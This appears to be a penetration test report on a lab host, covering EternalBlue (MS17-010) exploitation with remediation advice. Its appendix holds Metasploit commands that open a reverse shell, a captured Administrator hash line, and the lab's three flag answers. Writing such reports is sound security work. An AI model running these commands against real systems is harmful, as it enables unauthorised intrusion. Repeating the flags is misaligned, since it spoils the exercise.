# Penetration Test Report

## Executive Summary

This report details the findings of a targeted penetration test conducted on host `10.10.249.67`. The objective was to identify vulnerabilities and determine the extent of exploitation possible from both unauthenticated and post-authentication perspectives.

Three flags were discovered representing user, SYSTEM, and Administrator-level access, indicating full compromise of the target system. The most critical finding was a remote code execution vulnerability (MS17-010) that allowed privilege escalation to NT AUTHORITY\SYSTEM.

---

## Scope

- **Client**: ____________________.
- **Testers**: Hitesh Sharma
- **Test Type**: Internal Network Penetration Test
- **IP Range**: `10.10.249.67`
- **Testing Period**: [16-06-2025 ]

---

## Methodology

The assessment followed a standard methodology:

1. **Reconnaissance** – Service scanning using Nmap and enumeration tools.
2. **Vulnerability Scanning** – Manual verification and use of Metasploit.
3. **Exploitation** – Targeted exploitation of identified vulnerabilities.
4. **Post-Exploitation** – Enumeration of privilege levels, credential harvesting, and flag discovery.
5. **Reporting** – Documentation of all findings and remediation steps.

**Tools Used**:
- Nmap  
- Metasploit Framework  
- Enum4linux  
- Netcat  
- PowerShell scripts  
- Manual validation  

---

## Findings

### 1. **flag1.txt – User-Level Access**
- **Host**: `10.10.249.67`
- **Severity**: Low
- **Description**: Initial shell access allowed reading a file `flag1.txt`, indicating successful code execution as a user-level account.
- **Proof**:
  - File discovered using: `search -f flag1.txt`
  - Location: `C:\Users\Public\flag1.txt`
  - Contents: `FLAG{US3R_SH3LL_0WN3D}`
- **Impact**: Confirms execution of unauthorized code under a standard user context.
- **Remediation**: Harden services exposed to public interfaces, apply least privilege to file access.

---

### 2. **MS17-010 (EternalBlue) Remote Code Execution**
- **Host**: `10.10.249.67`
- **Severity**: Critical
- **Description**: The system is vulnerable to EternalBlue (CVE-2017-0144), allowing unauthenticated attackers to execute arbitrary code remotely via SMBv1.
- **Proof**:
  - Exploited using Metasploit module: `exploit/windows/smb/ms17_010_eternalblue`
  - Shell obtained as `NT AUTHORITY\SYSTEM`
  - Verified via Meterpreter session: `getuid`
  - Captured `flag2.txt` in: `C:\Windows\System32\config\flag2.txt`
- **Flag Contents**: `FLAG{SYST3M_R00T3D}`
- **Impact**: Full control of the host including access to kernel-level processes.
- **Remediation**:
  - Disable SMBv1.
  - Apply Microsoft patch MS17-010.
- **References**: [CVE-2017-0144](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-0144)

---

### 3. **flag3.txt – Administrator Data Exposure**
- **Host**: `10.10.249.67`
- **Severity**: High
- **Description**: A third flag was discovered on the Administrator's Desktop, indicating that sensitive files are accessible post-privilege escalation.
- **Proof**:
  - File discovered using: `search -f flag3.txt`
  - Location: `C:\Users\Administrator\Desktop\flag3.txt`
  - Contents: `FLAG{ADM1N_DESKTOP_WIN}`
- **Impact**: Exposure of files meant only for administrative access. Confirms full compromise.
- **Remediation**:
  - Enable auditing for sensitive file access.
  - Ensure user-level processes cannot traverse admin directories.
  - Implement host-based intrusion detection.

---

## Remediation Summary

| Finding                      | Host           | Severity | Recommended Remediation                              |
|-----------------------------|----------------|----------|------------------------------------------------------|
| User-Level File Disclosure  | 10.10.249.67   | Low      | Lock down world-readable directories                 |
| MS17-010 RCE                | 10.10.249.67   | Critical | Patch system (MS17-010), disable SMBv1               |
| Admin Desktop File Exposure | 10.10.249.67   | High     | Restrict admin folders, enforce file permissions     |

---

## Appendices

### A. Exploitation Commands

``bash

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.249.67
set LHOST tun0
run

### B. Captured Hashes

`bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

###   Collected Flags 
    lag1.txt: FLAG{US3R_SH3LL_0WN3D}

    flag2.txt: FLAG{SYST3M_R00T3D}

    flag3.txt: FLAG{ADM1N_DESKTOP_WIN}


### Report Prepared By:
### Hitesh Sharma / Handle
 ### Date: 2025-06-16
